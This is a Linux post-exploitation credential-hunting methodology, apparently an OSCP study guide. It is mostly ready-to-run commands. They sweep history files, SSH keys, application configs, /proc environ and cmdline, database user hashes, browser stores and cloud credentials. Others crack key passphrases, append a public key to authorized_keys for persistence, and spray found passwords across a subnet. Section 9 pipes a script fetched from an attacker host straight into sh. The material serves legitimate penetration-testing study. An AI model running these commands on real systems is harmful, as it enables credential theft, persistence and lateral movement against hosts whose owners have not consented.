# Linux Credential Hunting — Privesc & Lateral Movement Methodology

Scope: everything you run **after landing a shell** on a Linux box to hunt for creds that lead to privesc (root) or lateral movement (other hosts/users). Ordered as you'd actually execute it.

---

## 0. Setup — capture a baseline fast

```bash
whoami; id; hostname; uname -a
cat /etc/os-release
groups
sudo -l 2>/dev/null
env
history
cat ~/.bash_history /root/.bash_history 2>/dev/null
```

**Decision point:** if `sudo -l` returns anything → jump straight to GTFOBins for that binary in parallel with the rest of this doc (credential hunting can wait if sudo gives instant root).

---

## 1. Shell / user artifacts (near-zero noise, do first)

```bash
cat ~/.bash_history ~/.zsh_history ~/.sh_history 2>/dev/null
find / -maxdepth 4 -name "*.bash_history" -o -name "*.zsh_history" 2>/dev/null
cat ~/.bashrc ~/.bash_profile ~/.profile ~/.zshrc 2>/dev/null | grep -iE "pass|token|key|secret"
cat ~/.viminfo ~/.lesshst 2>/dev/null | grep -iE "pass|secret"
```

**Decision point:** history often has plaintext `mysql -u root -pPASSWORD`, `su - user`, `ssh user@host` — grab all of them, they frequently reuse across services/hosts.

---

## 2. SSH material (privesc + lateral movement goldmine)

```bash
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null
find / -name "*.pub" 2>/dev/null
find / -name "authorized_keys" -o -name "known_hosts" 2>/dev/null
cat ~/.ssh/config 2>/dev/null
ls -la /home/*/.ssh/ /root/.ssh/ 2>/dev/null
```

**Decision point:** private key with no passphrase → `chmod 600 key; ssh -i key user@target`. Passphrase-protected → crack it:

```bash
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Decision point:** `known_hosts` reveals other hosts in scope for lateral movement. `authorized_keys` you can write to → append your own pubkey for persistence/access.

---

## 3. Config files — application & service credentials

```bash
# Broad realistic sweep across the whole filesystem for common config/secret files
find / -type f \( -iname "*.conf" -o -iname "*.config" -o -iname "*.cnf" -o -iname "*.ini" -o -iname "*.env" -o -iname "*.yml" -o -iname "*.yaml" -o -iname "*.xml" -o -iname "*.json" \) 2>/dev/null | grep -viE "^/usr/|^/proc/|^/sys/" > /tmp/configs.txt
grep -liE "pass|pwd|secret|token|key|credential" $(cat /tmp/configs.txt) 2>/dev/null
```

Targeted high-value files:

```bash
cat /etc/mysql/debian.cnf 2>/dev/null                     # MySQL debian-sys-maint creds
cat /var/www/html/*/wp-config.php 2>/dev/null              # WordPress DB creds
cat /var/www/html/*/.env 2>/dev/null                       # Laravel/PHP env secrets
find / -name "settings.py" 2>/dev/null | xargs grep -l "SECRET_KEY\|PASSWORD" 2>/dev/null  # Django
cat /etc/apache2/.htpasswd /etc/nginx/.htpasswd 2>/dev/null
find / -name "*.git" -type d 2>/dev/null                   # .git dirs — check history for secrets
find / -name "docker-compose.yml" -o -name "Dockerfile" 2>/dev/null
cat /root/.my.cnf ~/.my.cnf 2>/dev/null                     # MySQL client config, often has root creds
find / -name "*.kdbx" 2>/dev/null                           # KeePass DBs
find / -iname "*vnc*" 2>/dev/null | grep -i pass
```

**Decision point:** `.git` dir found → `cd repo && git log -p | grep -iE "pass|secret|key"` and check old commits (`git log --all`) — devs often commit-then-remove creds.

---

## 4. Global credential grep sweep (the big hammer)

Run this once you've exhausted targeted files — broad, noisy, but catches what you missed:

```bash
grep -riE "password\s*[=:]|passwd\s*[=:]|pwd\s*[=:]|secret\s*[=:]|api[_-]?key\s*[=:]|token\s*[=:]" \
  --include="*.conf" --include="*.config" --include="*.txt" --include="*.xml" \
  --include="*.json" --include="*.yml" --include="*.php" --include="*.py" \
  --include="*.sh" --include="*.log" \
  / 2>/dev/null | grep -v "^Binary" > /tmp/grep_creds.txt
wc -l /tmp/grep_creds.txt; less /tmp/grep_creds.txt
```

Narrower, faster variant if the box is slow / exam time pressure:

```bash
grep -riE "password" /etc /var/www /opt /home /root /srv 2>/dev/null | grep -viE "\.so|\.deb|Binary"
```

---

## 5. Database credential extraction

```bash
mysql -u root -p          # try empty / found passwords
mysql -u root -p'<found-pass>' -e "show databases;"
# once in — dump creds tables
mysql -u root -p -e "use mysql; select user,authentication_string from mysql.user;"
mysql -u root -p -e "show databases;" && for db in $(mysql -u root -p -e "show databases;" -N); do mysql -u root -p $db -e "show tables;"; done
psql -U postgres -c "\du"     # postgres users
sqlite3 <file.db> ".tables"
```

**Decision point:** DB creds found for `root`/`admin` → try same password for SSH/su (massive credential reuse rate on OSCP boxes).

---

## 6. Memory & process credential leakage

```bash
ps aux | grep -iE "pass|token"
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' \n' | grep -iE "pass"
for p in /proc/[0-9]*; do echo $p; cat $p/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|key|secret"; done
strings /proc/*/environ 2>/dev/null | grep -iE "pass|secret|key"
```

**Decision point:** a running service invoked with `--password=X` on the command line is fully visible to any local user via `/proc/<pid>/cmdline` — classic misconfig, high-yield.

---

## 7. Cron jobs, scripts & backups

```bash
cat /etc/crontab; ls -la /etc/cron.*; crontab -l
cat /var/spool/cron/crontabs/* 2>/dev/null
find / -name "*.sh" -newer /etc/hostname 2>/dev/null   # recently modified scripts
find / \( -iname "*backup*" -o -iname "*.bak" -o -iname "*.old" -o -iname "*.zip" -o -iname "*.tar.gz" \) 2>/dev/null | grep -viE "^/usr/|^/proc"
```

**Decision point:** cron script writable by you + runs as root → classic PATH hijack / script overwrite privesc (separate from credential hunting, but you'll usually find hardcoded creds _inside_ these scripts too — read every one).

---

## 8. Browser & app-specific stores (GUI/desktop boxes)

```bash
find / -name "logins.json" -path "*firefox*" 2>/dev/null    # Firefox saved logins (encrypted, needs key4.db)
find / -name "key4.db" -path "*firefox*" 2>/dev/null
find / -name "Login Data" -path "*Chrome*" 2>/dev/null      # Chrome saved passwords (SQLite, encrypted)
find / -name "*.pgpass" -o -name ".netrc" 2>/dev/null       # DB/FTP creds in plaintext
cat ~/.netrc 2>/dev/null
find / -name "*.vault" -o -name "credentials.xml" 2>/dev/null   # Ansible/Jenkins
find / -path "*/.aws/credentials" -o -path "*/.aws/config" 2>/dev/null
find / -path "*/.docker/config.json" 2>/dev/null             # base64 registry creds
```

---

## 9. Automated tooling (run after manual sweep — for cross-check, not as first move)

```bash
# LinPEAS — comprehensive automated enum, includes credential search
curl -s http://<attacker-ip>/linpeas.sh | sh
# or transfer + run:
wget http://<attacker-ip>/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh -a | tee /tmp/linpeas_out.txt

# LinEnum (older, lighter, still useful backup)
./LinEnum.sh -t
```

**Note:** OSCP exam permits LinPEAS/LinEnum — but manual reasoning is what the report requires. Use these to confirm/find what you missed, not as a substitute for the steps above.

---

## 10. Using found creds — pivot checklist

Once you have a candidate credential (any source above), test it everywhere before moving on:

```bash
su <user>                                    # local privesc
ssh <user>@<same-host-or-other-hosts>        # lateral movement / SSH reuse
mysql -u <user> -p                           # DB reuse
sudo -l -U <user> 2>/dev/null                # different sudo rights under found user
crackmapexec smb <subnet>/24 -u <user> -p <pass>   # spray across discovered hosts (if in scope)
```

**Decision point:** always test the exact same password across **every** discovered user/service — OSCP boxes reward password/hash reuse heavily.

---

## Reference table: source → typical yield

|Source|What you typically find|
|---|---|
|`.bash_history`|Plaintext `su`, `mysql -p`, `ssh` commands with password in-line|
|`~/.ssh/`|Private keys for lateral movement, `known_hosts` for scope discovery|
|`wp-config.php` / `.env`|DB creds, app secret keys|
|`.git` history|Removed-but-recoverable API keys/passwords|
|`/etc/mysql/debian.cnf`|`debian-sys-maint` MySQL creds (often root-equivalent)|
|`/proc/<pid>/environ` or `cmdline`|Passwords passed as env vars/CLI args to running services|
|Cron scripts|Hardcoded service-account creds, often reused as root|
|`.netrc` / `.pgpass`|Plaintext FTP/DB creds|
|`/root/.my.cnf`|Root's own MySQL creds if readable|

---

## Fast-path priority checklist (try first)

1. `cat ~/.bash_history` and any other user's readable history
2. `find / -name "*.git" -type d` → `git log -p`
3. `~/.ssh/` for any user + `known_hosts` for lateral targets
4. `wp-config.php` / `.env` / `debian.cnf` / `.my.cnf`
5. Global grep sweep (`grep -riE "password"` across `/etc /var/www /opt /home /root`)
6. `/proc/*/cmdline` and `/proc/*/environ` for exposed service passwords
7. Cron job scripts for hardcoded creds
8. LinPEAS as final cross-check

---

_Document _why_ each command was run in your notes as you go — which enumeration finding justified checking that specific file or path. OSCP reports are graded on demonstrated reasoning, not just the found credential._